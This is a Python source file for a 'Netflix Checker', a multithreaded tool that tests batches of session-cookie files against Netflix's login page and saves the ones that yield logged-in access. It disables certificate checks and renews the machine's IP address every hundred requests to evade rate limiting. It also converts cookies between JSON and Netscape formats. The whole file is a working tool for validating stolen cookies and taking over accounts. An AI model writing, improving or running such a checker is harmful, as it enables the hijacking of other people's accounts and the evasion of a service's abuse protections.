import requests
import os
import colorama
import shutil
import json
import threading
import time
import subprocess
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from queue import Queue
import urllib3

# Suppress only the InsecureRequestWarning from urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Clear screen function
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Change IP address for Windows
def change_ip_windows():
    try:
        subprocess.run(["ipconfig", "/release"], check=True)
        subprocess.run(["ipconfig", "/renew"], check=True)
        print("IP address changed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to change IP address: {e}")

# Change IP address for Linux
def change_ip_linux():
    try:
        subprocess.run(["dhclient", "-r"], check=True)
        subprocess.run(["dhclient"], check=True)
        print("IP address changed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to change IP address: {e}")

# Create a session with retry mechanism
def create_session():
    session = requests.Session()
    retry = Retry(
        total=5,
        backoff_factor=1,
        status_forcelist=[500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "OPTIONS"]
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({'Accept-Encoding': 'identity'})
    return session

# Function to check Netscape format cookies
def check_netscape_cookies(num_threads=1):
    counts = {'hits': 0, 'bad': 0, 'errors': 0}
    request_count = 0

    def check_cookie(cookie_queue):
        nonlocal request_count
        while not cookie_queue.empty():
            cookie = cookie_queue.get()
            try:
                cookie_path = os.path.join("cookies", cookie)
                with open(cookie_path, 'r', encoding='utf-8') as f:
                    read_cookie = f.read()

                    cookies = {}
                    for line in read_cookie.splitlines():
                        parts = line.strip().split('\t')
                        if len(parts) >= 7:
                            domain, _, path, secure, expires, name, value = parts[:7]
                            cookies[name] = value

                    session = create_session()
                    session.cookies.update(cookies)

                    response = session.get("https://www.netflix.com/in/login", timeout=10, verify=False)

                    if "whos.watching" in response.text:
                        counts['hits'] += 1
                        print(colorama.Fore.GREEN + f"Login successful with {cookie}" + colorama.Fore.RESET)
                        shutil.copy(cookie_path, os.path.join("hits", cookie))
                    else:
                        counts['bad'] += 1
                        print(colorama.Fore.RED + f"Login failed with {cookie}" + colorama.Fore.RESET)
                        shutil.copy(cookie_path, os.path.join("bad", cookie))
            except Exception as e:
                counts['errors'] += 1
                print(colorama.Fore.RED + f"Error: {e} with {cookie}" + colorama.Fore.RESET)
                cookie_queue.put(cookie)  # Requeue the failed cookie for another attempt

            request_count += 1
            if request_count >= 100:
                request_count = 0
                if os.name == 'nt':
                    change_ip_windows()
                else:
                    change_ip_linux()

            # Delete the processed cookie file
            os.remove(cookie_path)

            cookie_queue.task_done()
            time.sleep(1)  # Add delay between requests

    cookie_files = os.listdir("cookies")
    cookie_queue = Queue()
    for cookie in cookie_files:
        cookie_queue.put(cookie)

    threads = []
    for _ in range(min(num_threads, len(cookie_files), 100)):
        thread = threading.Thread(target=check_cookie, args=(cookie_queue,))
        thread.start()
        threads.append(thread)

    cookie_queue.join()
    for thread in threads:
        thread.join()

    print("\n\nFinished Checking")
    print(f"Good: {counts['hits']} - Bad: {counts['bad']} - Errors: {counts['errors']}")
    input("Press enter to return\n")
    clear_screen()
    main()

# Function to check JSON format cookies
def check_json_cookies(num_threads=1):
    counts = {'hits': 0, 'bad': 0, 'errors': 0}
    request_count = 0

    def check_cookie(cookie_queue):
        nonlocal request_count
        while not cookie_queue.empty():
            cookie_name = cookie_queue.get()
            try:
                cookie_path = os.path.join("cookies", cookie_name)
                with open(cookie_path, 'r', encoding='utf-8') as f:
                    cookies_json = json.load(f)

                    cookies = {}
                    for cookie in cookies_json:
                        name = cookie.get('name')
                        value = cookie.get('value')
                        domain = cookie.get('domain')
                        path = cookie.get('path')
                        secure = cookie.get('secure', False)
                        expires = cookie.get('expires', None)

                        if name and value and domain and path:
                            cookies[name] = value

                    session = create_session()
                    session.cookies.update(cookies)

                    response = session.get("https://www.netflix.com/in/login", timeout=10, verify=False)

                    if "whos.watching" in response.text:
                        counts['hits'] += 1
                        print(colorama.Fore.GREEN + f"Login successful with {cookie_name}" + colorama.Fore.RESET)
                        shutil.copy(cookie_path, os.path.join("hits", cookie_name))
                    else:
                        counts['bad'] += 1
                        print(colorama.Fore.RED + f"Login failed with {cookie_name}" + colorama.Fore.RESET)
            except Exception as e:
                counts['errors'] += 1
                print(colorama.Fore.RED + f"Error: {e} with {cookie_name}" + colorama.Fore.RESET)
                cookie_queue.put(cookie_name)  # Requeue the failed cookie for another attempt

            request_count += 1
            if request_count >= 100:
                request_count = 0
                if os.name == 'nt':
                    change_ip_windows()
                else:
                    change_ip_linux()

            # Delete the processed cookie file
            os.remove(cookie_path)

            cookie_queue.task_done()
            time.sleep(1)  # Add delay between requests

    cookie_files = os.listdir("cookies")
    cookie_queue = Queue()
    for cookie in cookie_files:
        cookie_queue.put(cookie)

    threads = []
    for _ in range(min(num_threads, len(cookie_files), 100)):
        thread = threading.Thread(target=check_cookie, args=(cookie_queue,))
        thread.start()
        threads.append(thread)

    cookie_queue.join()
    for thread in threads:
        thread.join()

    print("\n\nFinished Checking")
    print(f"Good: {counts['hits']} - Bad: {counts['bad']} - Errors: {counts['errors']}")
    input("Press enter to return\n")
    clear_screen()
    main()

# Function to convert JSON format cookies to Netscape
def convert_json_to_netscape():
    print("Converting Json to Netscape...")
    clear_screen()

    def bool_to_string(s):
        return "TRUE" if s else "FALSE"

    def check_tail_match(s):
        return "TRUE" if s[0] == "." else "FALSE"

    convert_folder = 'convert'
    converted_folder = 'converted'

    for cookie in os.listdir(convert_folder):
        try:
            cookie_path = os.path.join(convert_folder, cookie)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                cookies_json = json.load(f)

                with open(os.path.join(converted_folder, cookie), 'w', encoding='utf-8') as write:
                    for x in cookies_json:
                        write.write(
                            f"{x['domain']}\t{check_tail_match(x['domain'])}\t{x['path']}\t{bool_to_string(x['secure'])}\t0\t{x['name']}\t{x['value']}\n")

        except Exception as e:
            print(f"Error: {e} with {cookie}")
            continue

    print("Completed converting cookies")
    input("Press enter to return\n")
    clear_screen()
    main()

# Function to convert Netscape format cookies to JSON
def convert_netscape_to_json():
    print("Converting Netscape to Json...")
    clear_screen()

    def string_to_bool(s):
        return s.upper() == "TRUE"

    convert_folder = 'convert'
    converted_folder = 'converted'

    for cookie in os.listdir(convert_folder):
        try:
            cookie_path = os.path.join(convert_folder, cookie)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                cookies = []
                for line in f:
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        domain, _, path, secure, expires, name, value = parts[:7]
                        cookies.append({
                            'domain': domain,
                            'path': path,
                            'secure': string_to_bool(secure),
                            'expires': None,
                            'name': name,
                            'value': value
                        })

                with open(os.path.join(converted_folder, cookie), 'w', encoding='utf-8') as write:
                    json.dump(cookies, write, indent=4)

        except Exception as e:
            print(f"Error: {e} with {cookie}")
            continue

    print("Completed converting cookies")
    input("Press enter to return\n")
    clear_screen()
    main()

# Main menu
def main():
    clear_screen()
    print("\n\n\t\tWelcome to Netflix Checker\n\n")
    print("\t\t1. Check Netscape Cookies")
    print("\t\t2. Check JSON Cookies")
    print("\t\t3. Convert JSON to Netscape")
    print("\t\t4. Convert Netscape to JSON")
    print("\t\t5. Exit")

    choice = input("\n\t\tChoose: ")

    if choice == "1":
        clear_screen()
        num_threads = int(input("Enter the number of threads (1-100): "))
        check_netscape_cookies(num_threads)
    elif choice == "2":
        clear_screen()
        num_threads = int(input("Enter the number of threads (1-100): "))
        check_json_cookies(num_threads)
    elif choice == "3":
        clear_screen()
        convert_json_to_netscape()
    elif choice == "4":
        clear_screen()
        convert_netscape_to_json()
    elif choice == "5":
        exit()
    else:
        clear_screen()
        main()

if __name__ == "__main__":
    main()
